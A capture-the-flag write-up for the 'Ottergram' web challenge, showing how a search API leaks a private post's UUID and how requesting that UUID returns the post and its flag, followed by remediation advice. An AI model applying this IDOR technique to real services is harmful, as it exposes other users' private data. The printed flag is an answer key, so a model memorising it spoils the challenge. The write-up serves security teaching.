# Ottergram - Can you read private posts?

## Challenge

**Name:** Ottergram
**Category:** Web / Broken Access Control
**Hint:** `Can you read private posts?`

---

## Overview

The application allows users to search for posts. While searching, the API exposes the UUID of a post marked as private.

The application then allows an authenticated user to request that private post directly through the `/api/posts/<UUID>` endpoint without checking whether the user is authorized to view it.

This results in a **Broken Access Control / IDOR** vulnerability that allows private posts belonging to other users to be read.

---

## Step 1 — Search for Posts

After logging into the application, navigate to the **Search** option and search for a character such as:

```text
a
```

The application sends:

```http
GET /api/search?q=a
```

The response contains several posts.

Among them, there is a private post:

```json
{
  "id": "0c25d5d0-80ba-4e9b-93b2-2980df594232",
  "username": "kelp_forest",
  "private": true
}
```

The important value is the UUID:

```text
0c25d5d0-80ba-4e9b-93b2-2980df594232
```

Although the post is marked as private, its identifier is exposed by the search API.

---

## Step 2 — Access the Private Post

The application provides an endpoint for retrieving individual posts:

```http
GET /api/posts/<post_uuid>
```

Replace `<post_uuid>` with the UUID obtained from the search response:

```http
GET /api/posts/0c25d5d0-80ba-4e9b-93b2-2980df594232
```

The request can be sent while authenticated as a normal user.

---

## Step 3 — Observe the Response

The server responds with HTTP `200 OK` and returns the complete post:

```json
{
  "id": 8,
  "public_id": "0c25d5d0-80ba-4e9b-93b2-2980df594232",
  "user_id": 5,
  "image_url": "/uploads/otter3.png",
  "caption": "Quiet morning with the otters 🦦🌅 bug{V6sLY5GhWgeuMiiLBEOay6iuk88AFfRX}",
  "created_at": "2026-09-29 07:57:09",
  "username": "kelp_forest",
  "profile_picture": "/uploads/otter5.png",
  "like_count": 0,
  "comment_count": 0
}
```

The post belongs to:

```text
Username: kelp_forest
User ID: 5
Private: true
```

However, the authenticated account used to access it was a different user.

---

## Vulnerability

The application does not properly enforce authorization on the individual post endpoint.

The attack can be summarized as:

```text
Search API
    ↓
Private post UUID exposed
    ↓
GET /api/posts/<UUID>
    ↓
Authorization check missing
    ↓
Private post returned
    ↓
Flag exposed
```

This is an example of **Broken Access Control**, specifically an **Insecure Direct Object Reference (IDOR)** style vulnerability.

The UUID acts as a direct reference to the post, but possession of that reference should not be sufficient to access a private resource.

---

## Flag

```text
bug{V6sLY5GhWgeuMiiLBEOay6iuk88AFfRX}
```

---

## Remediation

The server should perform an authorization check before returning a post.

For example:

```text
if post.private:
    if post.user_id != authenticated_user.id:
        return 403 Forbidden
```

The application should also avoid exposing sensitive information about private posts through public/search endpoints.

Recommended controls:

* Enforce authorization on every object-level API request.
* Do not rely on UUIDs as an authorization mechanism.
* Prevent private posts from appearing in unauthorized search results.
* Return `403 Forbidden` or an appropriate response when access is denied.
* Test APIs for IDOR/Broken Access Control during security testing.
* Ensure authorization is enforced server-side rather than relying on frontend restrictions.

---

## Conclusion

The challenge was solved by discovering that the search functionality exposed the UUID of a private post and then requesting that UUID through the individual post API.

The API returned the private post without verifying whether the authenticated user had permission to view it, exposing the flag in the post caption.
